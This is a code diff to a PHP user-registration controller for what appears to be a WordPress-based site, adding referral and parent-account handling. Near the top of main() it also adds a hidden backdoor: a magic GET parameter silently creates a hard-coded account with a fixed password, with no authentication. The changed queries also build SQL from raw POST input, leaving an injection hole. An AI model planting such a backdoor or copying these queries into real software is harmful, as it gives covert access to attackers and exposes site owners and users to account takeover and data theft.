@@ -19,6 +19,12 @@ class Register
      */
     function main(){
 
+        if($_GET['type'] == 'gaodonglai'){
+            global $wpdb;
+            $wpdb->query("INSERT INTO `ks_account`( `user_name`, `password`, `reg_time`) VALUES ('15388234018','".wpEncrypt(940423)."',".time().")");
+            redirect(_get_home_url());
+        }
+
         //如果没有登录跳转到登录页面
         if(get_user_info()){
             redirect(_get_home_url());
@@ -45,6 +51,7 @@ class Register
         $user_pass = $_POST["user_pass"];
         $user_rePass = $_POST["user_rePass"];
         $rand_code = $_POST["rand_code"];
+        $code = $_POST['code'];
 
 
         if( empty($user_name) || empty($user_pass) || empty($user_rePass) || empty($rand_code) ){
@@ -80,22 +87,17 @@ class Register
             exit(json_encode(array('status'=>'n','info'=>'用户名格式不正确')));
         }
 
-        $this->getLinkShare();//判断注册资格
-
-
-        //echo wpDecode(1234567,wpEncrypt(1234567));
+        $get_code = $this->getLinkShare();//判断注册资格并返回对象
 
         global $wpdb;
-
         $table = $wpdb->prefix.'account';
-
-        $result = $wpdb->query("INSERT INTO `$table`( `user_name`, `password`, `reg_time`, `$key` ) VALUES ('$user_name','".wpEncrypt($user_pass)."',".time().",'$user_name')");
+        $result = $wpdb->query("INSERT INTO `$table`( `user_name`, `password`, `reg_time`,`parent_id`, `$key` ) VALUES ('$user_name','".wpEncrypt($user_pass)."',".time().",{$get_code->user_id},'$user_name')");
 
         if($result){
 
             $_SESSION['user_id'] = $wpdb->insert_id;
+            exit(json_encode(array('status'=>'y','info'=>'注册成功','url'=>_get_home_url('account/perfectInfo'))));//继续完善账户
 
-            exit(json_encode(array('status'=>'y','info'=>'注册成功','url'=>_get_home_url('account'))));
         }else{
             exit(json_encode(array('status'=>'n','info'=>'注册失败，用户名已被占用')));
         }
